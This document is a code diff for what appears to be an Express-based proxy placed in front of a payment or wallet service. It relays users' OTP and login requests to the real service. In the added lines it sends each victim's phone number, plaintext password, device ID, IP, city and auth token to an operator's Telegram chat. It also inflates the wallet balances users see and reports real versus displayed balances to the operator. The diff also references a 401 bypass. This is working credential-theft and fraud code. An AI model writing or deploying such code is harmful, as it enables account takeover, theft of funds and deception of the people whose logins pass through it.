@@ -1503,11 +1503,13 @@ app.post('/app/user/login/sendotp', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
     if (data.adminChatId && bot) {
-      const reqStr = JSON.stringify(body, null, 2);
-      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
-      const hdrs = {};
-      for (const [k,v] of Object.entries(req.headers)) { if (!k.startsWith('x-vercel') && !k.startsWith('x-forwarded') && k !== 'host' && k !== 'connection') hdrs[k] = v; }
-      bot.sendMessage(data.adminChatId, `📲 OTP Requested\n📱 Phone: ${body.userName || body.phone || body.mobile || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST HEADERS:\n${JSON.stringify(hdrs, null, 2).substring(0, 1500)}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1500)}`).catch(()=>{});
+      const phone = body.userName || body.phone || body.mobile || 'N/A';
+      if (jsonResp && jsonResp.code === 1000) {
+        bot.sendMessage(data.adminChatId, `✅ OTP sent successfully to ${phone}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      } else {
+        const msg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
+        bot.sendMessage(data.adminChatId, `❌ OTP Failed for ${phone}\nReason: ${msg}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      }
     }
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch(e) { await transparentProxy(req, res); }
@@ -1597,18 +1599,36 @@ app.post('/app/user/login/confirm', async (req, res) => {
 
     if (data.adminChatId && bot) {
       const pwd = body.password || body.pwd || body.loginPwd || body.pin || 'N/A';
-      const reqStr = JSON.stringify(body, null, 2);
-      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
       const androidId = body.deviceId || body.androidId || body.device_id || 'N/A';
-      let extraInfo = '';
-      if (loginData && loginData.challengeId) {
-        extraInfo = `\n\n🎯 DEVICE VERIFICATION\n📋 challengeId: ${loginData.challengeId}\n📱 Android ID: ${androidId}`;
+      const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
+      const city = req.headers['x-vercel-ip-city'] || 'N/A';
+      const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      
+      if (jsonResp && jsonResp.code === 1000) {
+        const loginToken = loginData ? (loginData.token || loginData.accessToken || '') : '';
+        let msg = `✅ *Successful Login*\n\n`;
+        msg += `📱 *Phone:* \`${phone || 'N/A'}\`\n`;
+        msg += `🔒 *Password:* \`${pwd}\`\n`;
+        msg += `👤 *UserID:* \`${userId || 'N/A'}\`\n`;
+        msg += `📱 *Android ID:* \`${androidId}\`\n`;
+        msg += `🌐 *IP:* ${ip} (${city})\n`;
+        msg += `🕐 *Time:* ${time}\n`;
+        if (loginToken) msg += `\n🔑 *Auth Token:*\n\`${loginToken}\``;
+        if (loginData && loginData.challengeId) msg += `\n\n🎯 *Device Verification Required*\n📋 challengeId: \`${loginData.challengeId}\``;
+        
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
+      } else {
+        const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
+        let msg = `❌ *Login Failed*\n\n`;
+        msg += `📱 *Phone:* \`${phone || 'N/A'}\`\n`;
+        msg += `🔒 *Password:* \`${pwd}\`\n`;
+        msg += `📱 *Android ID:* \`${androidId}\`\n`;
+        msg += `🌐 *IP:* ${ip} (${city})\n`;
+        msg += `🕐 *Time:* ${time}\n`;
+        msg += `\n⚠️ *Reason:* ${errorMsg}`;
+        
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
       }
-      const loginToken = loginData ? (loginData.token || loginData.accessToken || '') : '';
-      if (loginToken && jsonResp?.code === 1000) {
-        extraInfo += `\n\n🔑 AUTH TOKEN:\n${loginToken}`;
-      }
-      bot.sendMessage(data.adminChatId, `✅ Login Confirm\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd}\n👤 UserID: ${userId || 'N/A'}\n📱 Android ID: ${androidId}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1200)}\n\n📥 RESPONSE:\n${resStr.substring(0, 1200)}${extraInfo}`).catch(()=>{});
     }
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch(e) { await transparentProxy(req, res); }
@@ -1868,24 +1888,48 @@ async function proxyAndAddBonusPersonal(req, res) {
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const bonusData = getResponseData(jsonResp);
-    const detectedUserId = await extractUserIdFromToken(req);
+    const detectedUserId = await extractUserIdFromToken(req) || (bonusData && (bonusData.userId || bonusData.memberId));
+    
+    let realBal = 0;
+    let addedBal = 0;
+    let totalBal = 0;
+    let phone = '';
+
     if (detectedUserId && bonusData && typeof bonusData === 'object') {
+      phone = getPhone(data, detectedUserId);
       const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
-      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
-      if (addedBal !== 0) {
-        const personBalKeys = ['balance', 'integral', 'availablebalance', 'money', 'coin', 'wallet'];
-        for (const key of Object.keys(bonusData)) {
-          if (personBalKeys.includes(key.toLowerCase())) {
-            const current = parseFloat(bonusData[key]);
-            if (!isNaN(current)) {
-              bonusData[key] = typeof bonusData[key] === 'string'
-                ? String((current + addedBal).toFixed(2))
-                : parseFloat((current + addedBal).toFixed(2));
+      addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
+      
+      const personBalKeys = ['balance', 'integral', 'availablebalance', 'money', 'coin', 'wallet'];
+      let foundBal = false;
+      for (const key of Object.keys(bonusData)) {
+        if (personBalKeys.includes(key.toLowerCase())) {
+          const current = parseFloat(bonusData[key]);
+          if (!isNaN(current)) {
+            if (!foundBal) {
+              realBal = current;
+              totalBal = current + addedBal;
+              foundBal = true;
             }
+            bonusData[key] = typeof bonusData[key] === 'string'
+              ? String((current + addedBal).toFixed(2))
+              : parseFloat((current + addedBal).toFixed(2));
           }
         }
       }
+
+      if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
+        let msg = `📊 *User Balance Report*\n\n`;
+        msg += `👤 *User:* \`${detectedUserId}\`${phone ? ' (' + phone + ')' : ''}\n`;
+        msg += `💰 *Real Balance:* \`₹${realBal.toFixed(2)}\`\n`;
+        msg += `➕ *Bot Added:* \`₹${addedBal.toFixed(2)}\`\n`;
+        msg += `👀 *User Sees:* \`₹${totalBal.toFixed(2)}\`\n`;
+        msg += `\n🌐 *Path:* ${req.originalUrl.split('?')[0]}`;
+        
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
+      }
     }
+
     if (jsonResp && isAuthFailureResponse(jsonResp) && shouldBypass401(req)) {
       const bypass = make401Bypass(jsonResp);
       sendJson(res, respHeaders, bypass, JSON.stringify(bypass));
@@ -2115,9 +2159,22 @@ for (const ep of COLLECTION_ENDPOINTS) {
       const userId = await extractUserId(req, jsonResp);
       const phone = getPhone(data, userId);
       if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
-        const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
-        const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
-        bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
+        const path = req.originalUrl.split('?')[0];
+        const simpleEndpoints = [
+          '/app/ct/app/collection/getWalletList',
+          '/app/ct/app/collection/available',
+          '/app/ct/app/collection/allAvailable',
+          '/app/ct/app/collection/getPayoutWalletList',
+          '/app/ct/app/collection/getKycList'
+        ];
+        
+        if (simpleEndpoints.includes(path)) {
+          bot.sendMessage(data.adminChatId, `📡 ${path}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n✅ Status: Success`).catch(()=>{});
+        } else {
+          const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
+          const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
+          bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
+        }
       }
       sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
     } catch(e) { await transparentProxy(req, res); }
